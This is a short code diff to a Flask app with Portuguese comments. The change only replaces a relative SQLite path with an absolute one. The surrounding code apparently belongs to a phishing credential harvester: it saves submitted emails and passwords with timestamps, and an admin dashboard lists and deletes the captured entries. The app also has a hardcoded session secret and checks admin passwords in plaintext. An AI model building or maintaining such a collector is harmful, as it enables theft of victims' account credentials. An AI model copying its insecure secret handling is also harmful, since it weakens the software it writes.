@@ -6,9 +6,13 @@ import os
 app = Flask(__name__)
 app.secret_key = "segredo_super_secreto"
 
+# Caminho absoluto para o banco de dados
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+db_path = os.path.join(BASE_DIR, "database/database.db")
+
 # Função para salvar credenciais
 def salvar_credenciais(email, senha):
-    conn = sqlite3.connect("database/database.db")
+    conn = sqlite3.connect(db_path)
     cursor = conn.cursor()
     data_hora = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     cursor.execute("INSERT INTO credenciais (email, senha, data_hora) VALUES (?, ?, ?)", (email, senha, data_hora))
@@ -37,7 +41,7 @@ def admin_login():
     if request.method == "POST":
         usuario = request.form["usuario"]
         senha = request.form["senha"]
-        conn = sqlite3.connect("database/database.db")
+        conn = sqlite3.connect(db_path)
         cursor = conn.cursor()
         cursor.execute("SELECT * FROM admin WHERE usuario=? AND senha=?", (usuario, senha))
         admin = cursor.fetchone()
@@ -54,7 +58,7 @@ def admin_login():
 def dashboard():
     if not session.get("admin"):
         return redirect("/admin")
-    conn = sqlite3.connect("database/database.db")
+    conn = sqlite3.connect(db_path)
     cursor = conn.cursor()
     cursor.execute("SELECT * FROM credenciais ORDER BY data_hora DESC")
     dados = cursor.fetchall()
@@ -66,7 +70,7 @@ def dashboard():
 def delete_credencial(id):
     if not session.get("admin"):
         return redirect("/admin")
-    conn = sqlite3.connect("database/database.db")
+    conn = sqlite3.connect(db_path)
     cursor = conn.cursor()
     cursor.execute("DELETE FROM credenciais WHERE id=?", (id,))
     conn.commit()
